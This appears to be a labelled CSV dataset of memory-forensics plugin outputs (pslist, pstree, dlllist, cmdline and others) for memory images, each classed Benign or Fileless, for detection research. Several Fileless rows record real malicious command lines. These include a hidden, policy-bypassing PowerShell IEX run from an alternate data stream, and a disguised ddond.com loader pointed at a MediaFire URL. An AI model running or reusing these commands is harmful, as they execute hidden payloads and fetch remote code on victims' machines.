Name,pslist,pstree,psxview,dlllist,handles,ldrmodules,svcscan,cmdline,Category
physmem34.raw,EXCEl.exe                                                                                                             ddond.com,The parent process is WMI                                                                                                                                                                                 The child process of WMI is ddond.com,EXCEl.exe                                                                                                             ddond.com,No unique dllls,EXCEl.exe                                                                                                             ddond.com,No unique ldrmodules,No unique services,"EXCEL.EXE executed the Commandline : ""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\User\Downloads\Remittance-Details-951244.xlam                                                                                                                                            ddond.com executed the Commandline : C:\\ProgramData\\ddond[.]com https://taxfile.mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27.htm/file",Fileless
physmem35.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                               The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe   ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
physmem36.raw,WINWORD.exe                  ,No unique parent and child processes,WINWORD.exe                                                ,No unique dllls,No unique handles,No unique ldrmodules,No unique services,"WINWORD.EXE executed the Command line : ""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE""  /n  C:\Users\User\Downloads\c26a351c36ac03aa09f5d98531a103f971b84e22b6a1312bf1dc501421434290.doc",Fileless
physmem37.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                                     The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe   ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
physmem38.raw,WINWORD.exe                ,No unique parent and child processes,WINWORD.exe           ,No unique dllls,No unique handles,No unique ldrmodules,No unique services,"WINWORD.EXE executed the Command line : ""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE""  /n  C:\Users\User\Downloads\c26a351c36ac03aa09f5d98531a103f971b84e22b6a1312bf1dc501421434290.doc",Fileless
physmem39.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                                      The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
physmem40.raw,powershell.exe                                                                                                    WINWORD.exe                                                                                                                                                                                                   nslookup.exe         ,The parent process is powershell.exe                                                                                                                                                              The child process of powershell.exe is nslookup.exe  ,powershell.exe                                                                             WINWORD.exe                                                                        nslookup.exe        ,No unique dllls,powershell.exe                                                                             WINWORD.exe                                                                        nslookup.exe    ,No unique ldrmodules,No unique services,"WINWORD.EXE executed the Command line : ""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n ""C:\Users\User\Downloads\340795d1f2c2bdab1f2382188a7b5c838e0a79d3f059d2db9eb274b0205f6981.doc                                                                                                                                       powershell.exe executed the Command line : ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -executionpolicy bypass -C IEX (Get-Content -Path C:\ProgramData\Windows -Stream kernel32.dll|Out-String)                ",Fileless
physmem41.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                                            The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
physmem42.raw,powershell.exe                                                                                                    WINWORD.exe                                                                                                                                                                                                   nslookup.exe         ,The parent process is powershell.exe                                                                                                                                                              The child process of powershell.exe is nslookup.exe  ,powershell.exe                                                                             WINWORD.exe                                                                        nslookup.exe    ,No unique dllls,powershell.exe                                                                             WINWORD.exe                                                                        nslookup.exe ,No unique ldrmodules,No unique services,"WINWORD.EXE executed the Command line : ""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n ""C:\Users\User\Downloads\340795d1f2c2bdab1f2382188a7b5c838e0a79d3f059d2db9eb274b0205f6981.doc                                                                                                                                       powershell.exe executed the Command line : ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -executionpolicy bypass -C IEX (Get-Content -Path C:\ProgramData\Windows -Stream kernel32.dll|Out-String)           ",Fileless
physmem43.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                                        The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
physmem44.raw,powershell.exe                                                                                                   Servicehub.exe                                                                                                      cmd.exe,The parent process is Servicehub.exe                                                                                                                                                            The child process of Servicehub.exe is powershell.exe                                                                                                                  The child process of Servicehub.exe is cmd.exe,powershell.exe                                                                                                   Servicehub.exe                                                                                                      cmd.exe,"KERNEL32.dll              OLEAUT32.dll
SHELL32.dll
WINHTTP.dll
ole32.dll
urlmon.dll    ",powershell.exe                                                                                                   Servicehub.exe                                                                                                      cmd.exe,"KERNEL32.dll              OLEAUT32.dll
SHELL32.dll
WINHTTP.dll
ole32.dll
urlmon.dll    ",No unique services,"ServiceHub.exe executed the Command line : ""C:\ProgramData\xAE Operating System\ServiceHub.exe"" ",Fileless
physmem45.raw,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                             lsass.exe                                              explorer.exe  ,The parent process is System                                                                                                                                             The child process of System is smss.exe                                                                                                                                                                                                                                                                                    The parent process is smss.exe                                                                                                                                                                          The child process of  smss.exe is wininit.exe                                                                                                          The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is RuntimeBroker.exe                                                                              The parent process is svchost.exe                                                                                                                                                                         The child process of svchost.exe is taskhostw.exe                                                                                                              The parent process is smsss.exe                                                                                                                                                                        The child process of smss.exe is winlogon.exe                                                                                                    The parent process is smss.exe                                                                                                                                       The child process of smss.exe is csrss.exe                                                                                                                 The parent process is service.exe                                                                                                                                   The child process of service.exe is svchost.exe                                                                                                                                                                                                                   The parent process is wininit.exe                                                                                                                                       The child process of wininit.exe is lsass.exe                                                                                                               The parent process is userinit.exe                                                                                                                                    The child process of userinit.exe is explorer.exe ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll   ,System                                                    smss.exe                                            wininit.exe                                         Runtimebroker.exe                     taskhostw.exe                                 winlogon.exe                                    csrss.exe                                            service.exe                                      svchost.exe                                                                                   lsass.exe                                              explorer.exe  ,ADVAPI32.dll            KERNEL32.dll                               USER32.dll                              ntdll.dll      ,SamSs                                                Keylso                                                 VaultSvc                                             Eventlog                                                  Task Scheduler,smss.exe executed the Command line :  \SystemRoot\smss.exe                                                                      wininit.exe executed the Command line : wininit.exe                                                                                                 RuntimeBroker executed the Command line : C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                         taskhostwexe executed the Command line : taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                   winlogon.exe executed the Command line : winlogon.exe                                                                                          csrss.exe executed the Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024                                                                                                             services.exe executed the Command line : C:\Windows\system32\services.exe                                 svchost.exe executed the Command line : C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                       lsass.exe executed the Command line : C:\Windows\system32\lsass.exe                                                        explorer.exe executed the Command line : C:\Windows\Explorer.EXE ,Benign
